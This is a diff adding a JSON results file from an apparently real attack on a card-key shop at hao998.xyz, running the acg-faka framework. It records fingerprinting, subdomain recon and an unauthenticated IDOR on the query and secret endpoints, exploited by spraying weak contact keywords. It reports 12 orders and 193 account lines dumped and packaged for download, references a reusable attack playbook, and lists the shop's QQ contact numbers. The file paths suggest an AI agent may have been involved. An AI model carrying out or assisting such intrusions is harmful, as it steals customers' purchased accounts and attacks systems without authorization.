@@ -1,0 +1,52 @@
+{
+  "target": "https://hao998.xyz/",
+  "ts": "2026-08-04T14:22:00Z",
+  "stack": {
+    "framework": "acg-faka / 异次元简单发卡网",
+    "version_hint": "assets v=1.4.3",
+    "cookie": "ACG-SHOP",
+    "shop_name": "简单发卡网",
+    "notice_qq": ["303977864", "86081976"]
+  },
+  "playbook": {
+    "source": "/data/recon/playbooks/yiciyuan-faka-playbook.md",
+    "sb_subdomain_path": "miss_wildcard_all_point_to_main_shop",
+    "suran888_contact_spray_path": "HIT"
+  },
+  "subdomains": {
+    "note": "sb/shop/store/wallet/api/checker/shopping all DNS→45.207.208.170 serve same ACG shop; /api/records is HTML 404 not account-checker"
+  },
+  "vulns": [
+    {
+      "id": "acg_query_secret_idor",
+      "title": "Unauth query/secret IDOR via weak contact",
+      "endpoints": [
+        "POST /user/api/index/query keywords=<contact|tradeNo>",
+        "POST /user/api/index/secret orderId=<tradeNo>&password="
+      ],
+      "hit_keywords": ["123", "123123", "12323"],
+      "orders_dumped": 12,
+      "account_lines": 193,
+      "total_amount": 182.4
+    }
+  ],
+  "success_cases_migration": {
+    "rainbow_ykfaka": "N/A",
+    "qq898_sb_records": "N/A_no_checker_subdomain",
+    "suran888_contact_spray": "REUSED_SUCCESS"
+  },
+  "kami_obtained": true,
+  "kami_stats": {
+    "orders": 12,
+    "account_lines": 193,
+    "hit_keywords": ["123", "123123", "12323"],
+    "artifacts": [
+      "results/dump/contact_kami_clean.json",
+      "results/dump/contact_kami_accounts.txt",
+      "results/dump/contact_kami_dedup.tsv",
+      "results/dump/contact_kami_stats.json"
+    ]
+  },
+  "hk_artifacts": "/data/recon/hao998/",
+  "download": "/opt/cursor/artifacts/hao998_kami_dump.zip"
+}
